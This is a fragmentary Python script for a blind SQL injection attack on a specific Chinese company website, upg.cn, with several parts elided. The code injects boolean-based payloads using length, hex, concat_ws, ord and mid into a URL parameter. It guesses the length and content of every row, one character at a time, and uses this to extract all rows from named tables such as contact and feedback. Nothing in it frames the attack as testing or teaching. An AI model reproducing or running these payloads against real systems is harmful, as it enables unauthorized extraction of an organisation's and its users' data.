...
zxUrl="http://www.upg.cn/upgcompany_detail.php?id=2303"
...
def inject(payload):
  ...
  #print url
  if DEBUG:
    logPrint(urllib2.quote(payload))
  response="None"
  try:
...
def getAllItemsInTable(tableItem,schema):
  ...
  itemLen=itemLen-1
  myPrint("<<"+table+">> has :<"+str(itemLen)+"> item:\n",True)  
  if(itemLen==0):
    myPrint(table+" has nothing \n",True)
    return     
  while i<itemLen:
    payload=" and ((select length(hex(concat_ws(0x3a,"+sqlStr+"))) from "+tableEx+" limit "+str(i)+",1)>%d)-- -"
    length=guessLength(payload,100)+1
    if length>101:
    ...
    myPrint("<<<"+str(i)+","+str(length)+":#") 
    payload=" and ((select  ord(mid(((hex(concat_ws(0x3a,"+sqlStr+")))),%d,1)) from "+tableEx+" limit "+str(i)+",1)>%d)-- -"
    guessItem(payload,length,True)
    i=i+1
...
def dataInit():
  ...
  focusTableList=[]
  focusSchema="npg"
  allSchemaList=["upg","upgen"]
  #allSchemaList=["blindinjection"]
  tableReflect={}
  tableReflect["upg"]=["bbs_forum","bbs_reply","branch","contact","feedback",\
  ...
  tableReflect["upgen"]=["bbs_forum","bbs_reply","branch","contact","feedback","homeimg",\
